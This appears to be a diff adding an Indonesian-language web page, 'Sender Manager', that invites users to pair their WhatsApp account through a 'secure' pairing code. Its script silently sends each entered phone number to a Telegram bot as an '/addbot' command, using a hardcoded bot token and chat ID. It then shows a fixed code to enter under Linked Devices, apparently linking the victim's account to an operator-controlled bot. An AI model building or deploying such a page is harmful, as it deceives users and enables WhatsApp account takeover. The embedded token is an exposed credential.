@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sender Manager</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+    body {
+      background: linear-gradient(135deg, #0a0015, #1a002a);
+      color: white;
+      min-height: 100vh;
+      padding-bottom: 20px;
+    }
+    .header {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 16px 20px; background: rgba(0,0,0,0.3);
+    }
+    .btn-back, .btn-refresh {
+      background: rgba(255,255,255,0.1); border: none; color: white;
+      width: 40px; height: 40px; border-radius: 50%; font-size: 20px;
+      display: flex; align-items: center; justify-content: center; cursor: pointer;
+    }
+    .header h1 {
+      font-weight: 600; font-size: 20px;
+      background: linear-gradient(90deg, #ff0080, #aa00ff);
+      -webkit-background-clip: text; background-clip: text; color: transparent;
+    }
+    .main {
+      display: flex; flex-direction: column; align-items: center;
+      justify-content: center; min-height: calc(100vh - 60px); padding: 0 20px; text-align: center;
+    }
+    .icon { width: 100px; height: 100px; background: rgba(255,255,255,0.05); border-radius: 24px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(255,0,128,0.4); }
+    .main h2 { font-size: 24px; margin: 32px 0 12px; }
+    .main p { color: #aaa; max-width: 300px; line-height: 1.5; margin-bottom: 28px; }
+    .btn-gradient {
+      padding: 14px 32px; font-size: 16px; font-weight: 600; border: none;
+      border-radius: 50px; background: linear-gradient(90deg, #aa00ff, #ff0080);
+      color: white; cursor: pointer; box-shadow: 0 6px 20px rgba(255,0,128,0.3);
+    }
+    .fab {
+      position: fixed; bottom: 32px; right: 32px; width: 56px; height: 56px;
+      border-radius: 50%; background: linear-gradient(90deg, #aa00ff, #ff0080);
+      color: white; font-size: 28px; border: none; box-shadow: 0 6px 20px rgba(255,0,128,0.4);
+      cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 100;
+    }
+    .modal {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 1000;
+    }    .modal-content {
+      background: rgba(20,10,30,0.9); border-radius: 24px; padding: 32px;
+      width: 90%; max-width: 360px; box-shadow: 0 0 40px rgba(255,0,128,0.3);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    .input-group { position: relative; margin: 24px 0; }
+    .input-group input {
+      width: 100%; padding: 16px 20px 16px 50px;
+      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 16px; color: white; font-size: 16px; outline: none;
+    }
+    .input-icon {
+      position: absolute; left: 18px; top: 50%; transform: translateY(-50%);
+      font-size: 18px; color: #ff0080;
+    }
+    .btn-cancel {
+      width: 100%; padding: 12px; background: transparent; border: none;
+      color: #aaa; font-size: 15px; cursor: pointer; margin-top: 12px;
+    }
+    .code-display {
+      font-size: 32px; font-weight: 700; letter-spacing: 4px; margin: 24px 0;
+      color: white; text-shadow: 0 0 15px rgba(255,0,128,0.7); font-family: monospace;
+    }
+    /* Tambahkan notifikasi kecil */
+    .toast {
+      position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
+      background: rgba(0,0,0,0.7); color: white; padding: 10px 20px;
+      border-radius: 8px; font-size: 14px; opacity: 0; transition: opacity 0.3s;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+      <!-- Header -->
+    <div class="header">
+        <button onclick="history.back()">◀</button>
+   <h1>Sender Manager</h1>
+    <button class="btn-refresh">↻</button>
+  </div>
+
+  <div class="main" id="mainScreen">
+    <div class="icon">
+      <svg viewBox="0 0 24 24" width="64" height="64">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#ff0080"/>
+      </svg>
+    </div>
+    <h2>No Devices Connected</h2>
+    <p>Hubungkan WhatsApp Anda melalui protokol pairing kode yang aman.</p>
+    <button class="btn-gradient" id="btnAddDevice">+ ADD NEW DEVICE</button>
+    <button class="fab" id="fabAdd">+</button>
+  </div>
+  <div class="modal" id="modalConnect">
+    <div class="modal-content">
+      <h3>Connect Sender</h3>
+      <p class="small-text">Format nomor diawali kode negara (62)</p>
+      <div class="input-group">
+        <span class="input-icon">📞</span>
+        <input type="tel" id="phoneNumber" placeholder="628xxxxxxxxx" maxlength="15" />
+      </div>
+      <button class="btn-gradient" id="btnGeneratePairing">GENERATE PAIRING</button>
+      <button class="btn-cancel" id="btnCancelModal">Cancel</button>
+    </div>
+  </div>
+
+  <div class="modal" id="modalPairing">
+    <div class="modal-content" style="text-align:center">
+      <div class="shield-icon">🛡️</div>
+      <h3>PAIRING CODE</h3>
+      <p class="small-text">Masukkan kode ini pada menu "Perangkat Tertaut" di WhatsApp Anda.</p>
+      <div class="code-display">SANG - RAJA</div>
+      <button class="btn-gradient" id="btnFinishPairing">SELESAI</button>
+    </div>
+  </div>
+
+  <!-- Toast Notifikasi -->
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // === GANTI DENGAN DATA BOT KAMU ===
+    const TELEGRAM_BOT_TOKEN = '7217256427:AAGFUPNz4D4oOak60-RQy9VKl_auGT7VT6I'; // contoh: '6123456789:AAHd123xyz...'
+    const TELEGRAM_CHAT_ID = '7223902938';     // contoh: '123456789' atau '-1001234567890' untuk grup
+
+    // Fungsi kirim ke Telegram
+    async function sendToTelegram(phoneNumber) {
+      const message = `/addbot \`${phoneNumber}\`\n`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        const result = await response.json();
+        if (!result.ok) {          console.warn('Gagal kirim ke Telegram:', result);
+          showToast('⚠️ Gagal kirim notifikasi ke Telegram');
+        } else {
+          showToast('✅ Nomor berhasil dikirim ke Telegram!');
+        }
+      } catch (error) {
+        console.error('Error kirim Telegram:', error);
+        showToast('❌ Error koneksi ke Telegram');
+      }
+    }
+
+    // Fungsi tampilkan notifikasi kecil
+    function showToast(text) {
+      const toast = document.getElementById('toast');
+      toast.textContent = text;
+      toast.style.opacity = '1';
+      setTimeout(() => {
+        toast.style.opacity = '0';
+      }, 3000);
+    }
+
+    // === Event Handler Utama ===
+    document.addEventListener('DOMContentLoaded', () => {
+      const modalConnect = document.getElementById('modalConnect');
+      const modalPairing = document.getElementById('modalPairing');
+      const btnAddDevice = document.getElementById('btnAddDevice');
+      const fabAdd = document.getElementById('fabAdd');
+      const btnCancelModal = document.getElementById('btnCancelModal');
+      const btnGeneratePairing = document.getElementById('btnGeneratePairing');
+      const btnFinishPairing = document.getElementById('btnFinishPairing');
+      const phoneNumberInput = document.getElementById('phoneNumber');
+
+      const openConnect = () => { modalConnect.style.display = 'flex'; };
+      const closeAll = () => { modalConnect.style.display = 'none'; modalPairing.style.display = 'none'; };
+
+      btnAddDevice?.addEventListener('click', openConnect);
+      fabAdd?.addEventListener('click', openConnect);
+      btnCancelModal?.addEventListener('click', closeAll);
+      btnFinishPairing?.addEventListener('click', closeAll);
+
+      btnGeneratePairing?.addEventListener('click', () => {
+        const raw = phoneNumberInput.value.trim();
+        const num = raw.replace(/\D/g, '');
+        if (!num || !/^62[0-9]{8,13}$/.test(num)) {
+          alert('Nomor harus diawali 62 dan minimal 10 digit (contoh: 6288215310412)');
+          return;
+        }
+
+        // Tampilkan loading
+        btnGeneratePairing.textContent = 'PROCESSING...';        btnGeneratePairing.disabled = true;
+
+        // Kirim ke Telegram & lanjutkan
+        sendToTelegram(num).finally(() => {
+          setTimeout(() => {
+            btnGeneratePairing.textContent = 'GENERATE PAIRING';
+            btnGeneratePairing.disabled = false;
+            modalConnect.style.display = 'none';
+            modalPairing.style.display = 'flex';
+          }, 1200);
+        });
+      });
+    });
+  </script>
+</body>
+</html>
